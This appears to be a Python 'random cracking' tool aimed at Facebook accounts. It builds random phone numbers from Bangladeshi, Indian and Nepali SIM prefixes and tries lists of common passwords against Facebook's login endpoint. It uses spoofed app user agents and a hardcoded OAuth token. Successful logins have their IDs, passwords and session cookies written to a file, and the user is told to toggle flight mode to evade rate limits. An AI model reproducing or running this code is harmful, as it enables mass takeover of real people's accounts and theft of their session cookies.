...
try:
        ...
        from string import *
        from concurrent.futures import ThreadPoolExecutor as elite
...
#-----------------------[ SC-CODE ]-----------------------#
main_x = f'{A}({X1}1{A}){a} Bd Random \n {A}({X1}2{A}){b} India random \n {A}({X1}3{A}){c} Napal random. \n {A}({X1}4{A}){c} Exit menu';bd_x = '017 | 018 | 019';np_x = ' 9815 | 9814 | 9861 | 9840 ';ind_x = '+91639 | +91600 | +91620';line_x = f'{A}──────────────────────────────────────────────────';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
...
ua1="[FBAN/Orca-Android;FBAV/"+str(random.choice(range(100,300)))+".0.0.30."+str(random.choice(range(100,300)))+";FBPN/com.facebook.orca;FBLC/en_AU;FBBV/"+str(random.choice(range(100999999,300999999)))+";FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]"
ua2="[FBAN/;FBAV/YZWSES93;FBBV/"+str(random.choice(range(100999999,300999999)))+";FBAN/FBAN;FBAV/YZWSES93;FBBV/"+str(random.choice(range(100999999,300999999)))+";FBDM//*{density=2.5,width=2560,height=3840};FBLC/ru_RU;FBRV/723459439;FBCR/TECNO;FBMF/OnePlus;FBBD/Gionee;FBPN/com.facebook.katana;FBDV/Nokia_X120;FBSV/12;FBOP/4;FBCA/armeabi;FBSS/;]"
ua3="[FBAN/Orca-Android;FBAV/"+str(random.choice(range(100,300)))+".0.0.13."+str(random.choice(range(100,300)))+";FBPN/com.facebook.orca;FBLC/es_US;FBBV/"+str(random.choice(range(100999999,300999999)))+";FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]"
...
def met2():
    ...
    main="[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184967;FBDM/{density=2.625,width=1080,height=2181};FBLC/uk_UA;FBRV/349092919;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
...
def redmi():
    ...
    main="[FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
...
def Bgrph_ua():
    ...
    android_version = random.choice(['9', '10'])
...
logo = f"""{A}
 ...
 {G4}██╔══╝░░██╔══██║██╔══██╗██╔══██║██╔══██╗██║
 {G5}██║░░░░░██║░░██║██║░░██║██║░░██║██████╦╝██║
 {G6}╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝ {G1}[{A}V{G1}/{A}05.9{G1}]
{A}──────────────────────────────────────────────────
 {A}({X1}+{A}){G1} OWNER    {A}:{G1} FOYSAL AHMED FARABI
 {A}({X1}+{A}){G2} FACEBOOK {A}:{G2} FOYSAL AHMED AKHI
 {A}({X1}+{A}) {G3}TOOLTYPE {A}:{G3} FREE... 
{A}──────────────────────────────────────────────────"""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f' {A}({X1}1{A}){a} Random Cracking \n {A}({X1}2{A}){a} Help Senter \n {A}({X1}3{A}){a} Exit Manu ');line()
    manu = input(f' {A}({X1}+{A}) {c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/profile.php?id=100008774563121');Main()
    else:Main()
...
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f' {A}({X1}+{A}){a} Example : {bd_x} ');line();code = input(f' {A}({X1}+{A}) Find Sim Code : ')
        fresh();print(f' {A}({X1}+{A}){a} Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' {A}({X1}+{A}) Find Limit : '))
        fresh();print(f' {A}({X1}+{A}){a} {cp_x} ');line();cpy = input(f' {A}({X1}+{A}) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' {A}({X1}+{A}){a} {coki_x} ');line();cokiy = input(f' {A}({X1}+{A}) {c} (Y|N) : ')
        ...
        with elite(max_workers=30) as akash:
                tl = str(len(user))
                fresh();print(f' {A}({X1}+{A}){a} Sim Code    : {code} \n {A}({X1}+{A}){a} Total Limit : {limit} \n {A}({X1}+{A}) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],ids[:6],ids[:11],ids[:9],'bangladesh','@@@###','১২৩৪৫৬','mehedi','sumaiya','jannatul','sabbir','@123456@','sadiya','nusrat','jannat','Nusrat']
                        akash.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' {A}({X1}+{A}) Example : {ind_x}  ');line();code = input(f' {A}({X1}+{A}) Find Sim Code : ')
        fresh();print(f' {A}({X1}+{A}) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' {A}({X1}+{A}) Find Limit : '))
        fresh();print(f' {A}({X1}+{A}) {cp_x} ');line();cpy = input(f' {A}({X1}+{A}) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' {A}({X1}+{A}) {coki_x} ');line();cokiy = input(f' {A}({X1}+{A}) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with elite(max_workers=30) as akash:
                tl = str(len(user))
                fresh();print(f' {A}({X1}+{A}) Sim Code    : {code} \n {A}({X1}+{A}) Total Limit : {limit} \n {A}({X1}+{A}) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
                        akash.submit(rndmx,ids,pasx,tl)
def rndm_nep():
        fresh();print(f' {A}({X1}+{A}) Example : {np_x}  ');line();code = input(f' {A}({X1}+{A}) Find Sim Code : ')
        fresh();print(f' {A}({X1}+{A}) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' {A}({X1}+{A}) Find Limit : '))
        fresh();print(f' {A}({X1}+{A}) {cp_x} ');line();cpy = input(f' {A}({X1}+{A}) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' {A}({X1}+{A}) {coki_x}');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
...
def rndmx(ids,pasx,tl):
        global loop,ok,rx
        bo=random.choice([a,G2,X,b,c,w])
        f=random.choice(['+','-'])
        sys.stdout.write(f'\r{G5} ({A}ELITE{G5}) ({X2}{f}{loop}{R}) ({M}{str(ids)}{R}) ({G2}+{len(ok)}{w}|{R}-{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        ...
                        headers = {'User-Agent': redmi(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{R}[{G1}FARABI_ok{R}]{G1} {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{A}>{R}[🍥]{A}<{G3} {coki} ')
                                open('/sdcard/FARABI-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{R}[{R}FARABI-CP{R}]{R} {str(uid)} | {pas} ')
                                open('/sdcard/FARABI-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
